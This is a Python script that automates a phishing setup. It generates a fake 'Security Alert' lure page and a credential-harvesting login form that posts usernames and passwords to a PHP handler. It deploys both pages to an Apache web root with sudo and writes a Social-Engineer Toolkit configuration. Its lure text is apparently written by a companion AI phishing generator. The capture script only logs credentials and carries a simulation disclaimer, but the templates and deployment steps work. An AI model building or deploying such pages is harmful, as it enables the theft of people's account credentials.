#!/usr/bin/env python3
import os
import sys
import subprocess
import json
from datetime import datetime

class AutomatedPhishingSetup:
    def __init__(self):
        self.set_path = "/opt/setoolkit"
        self.web_root = "/var/www/html"
        self.templates_dir = "phishing_templates"
        
    def create_template_directory(self):
        """Create directory for phishing templates"""
        if not os.path.exists(self.templates_dir):
            os.makedirs(self.templates_dir)
            print(f"Created template directory: {self.templates_dir}")
    
    def generate_html_template(self, content, template_name):
        """Convert text content to HTML template"""
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Security Alert</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .container {{ max-width: 600px; margin: 0 auto; }}
        .alert {{ background-color: #f8d7da; border: 1px solid #f5c6cb; 
                 color: #721c24; padding: 15px; border-radius: 5px; }}
        .button {{ background-color: #007bff; color: white; padding: 10px 20px; 
                  text-decoration: none; border-radius: 5px; display: inline-block; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="alert">
            <h2>Security Alert</h2>
            <pre>{content}</pre>
            <br>
            <a href="credential_harvester.html" class="button">Verify Account</a>
        </div>
    </div>
</body>
</html>
        """
        
        template_path = os.path.join(self.templates_dir, f"{template_name}.html")
        with open(template_path, 'w') as f:
            f.write(html_content)
        
        print(f"HTML template created: {template_path}")
        return template_path
    
    def create_credential_harvester(self):
        """Create credential harvesting page"""
        harvester_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Account Verification</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background-color: #f5f5f5; }
        .container { max-width: 400px; margin: 0 auto; background: white; 
                    padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; 
                                                    border: 1px solid #ddd; border-radius: 5px; }
        .submit-btn { background-color: #007bff; color: white; padding: 12px 30px; 
                     border: none; border-radius: 5px; cursor: pointer; width: 100%; }
        .submit-btn:hover { background-color: #0056b3; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Account Verification Required</h2>
        <p>Please enter your credentials to verify your account:</p>
        
        <form action="process_credentials.php" method="POST">
            <div class="form-group">
                <label for="username">Username/Email:</label>
                <input type="text" id="username" name="username" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            
            <button type="submit" class="submit-btn">Verify Account</button>
        </form>
    </div>
    
    <script>
        // Log credentials (for demonstration - in real scenario, this would send to attacker)
        document.querySelector('form').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            console.log('Captured credentials:', {username, password});
            alert('Account verified successfully! (This is a simulation)');
        });
    </script>
</body>
</html>
        """
        
        harvester_path = os.path.join(self.templates_dir, "credential_harvester.html")
        with open(harvester_path, 'w') as f:
            f.write(harvester_html)
        
        print(f"Credential harvester created: {harvester_path}")
        return harvester_path
    
    def deploy_to_webserver(self, template_path):
        """Deploy template to Apache web server"""
        try:
            # Copy template to web root
            subprocess.run(['sudo', 'cp', template_path, self.web_root], check=True)
            subprocess.run(['sudo', 'cp', os.path.join(self.templates_dir, "credential_harvester.html"), 
                          self.web_root], check=True)
            
            # Set proper permissions
            subprocess.run(['sudo', 'chown', 'www-data:www-data', 
                          os.path.join(self.web_root, os.path.basename(template_path))], check=True)
            subprocess.run(['sudo', 'chown', 'www-data:www-data', 
                          os.path.join(self.web_root, "credential_harvester.html")], check=True)
            
            print(f"Template deployed to web server")
            print(f"Access at: http://localhost/{os.path.basename(template_path)}")
            
        except subprocess.CalledProcessError as e:
            print(f"Error deploying to web server: {e}")
    
    def create_set_config(self, template_name):
        """Create SET configuration for automated attack"""
        config = {
            "attack_type": "website_attack",
            "template": template_name,
            "port": "80",
            "ip": "127.0.0.1"
        }
        
        config_path = os.path.join(self.templates_dir, f"{template_name}_config.json")
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
        
        print(f"SET configuration created: {config_path}")
        return config_path

def main():
    setup = AutomatedPhishingSetup()
    setup.create_template_directory()
    
    print("Automated Phishing Setup")
    print("1. Generate AI content first using ai_phishing_generator.py")
    
    content_file = input("Enter path to generated content file: ").strip()
    
    if not os.path.exists(content_file):
        print("Content file not found!")
        return
    
    with open(content_file, 'r') as f:
        content = f.read()
    
    template_name = input("Enter template name: ").strip()
    
    # Create HTML template
    template_path = setup.generate_html_template(content, template_name)
    
    # Create credential harvester
    setup.create_credential_harvester()
    
    # Deploy to web server
    setup.deploy_to_webserver(template_path)
    
    # Create SET configuration
    setup.create_set_config(template_name)
    
    print("\nAutomated phishing setup complete!")
    print("Next steps:")
    print("1. Test the phishing page in a browser")
    print("2. Use SET for advanced social engineering attacks")
    print("3. Monitor and analyze results (in authorized testing only)")

if __name__ == "__main__":
    main()
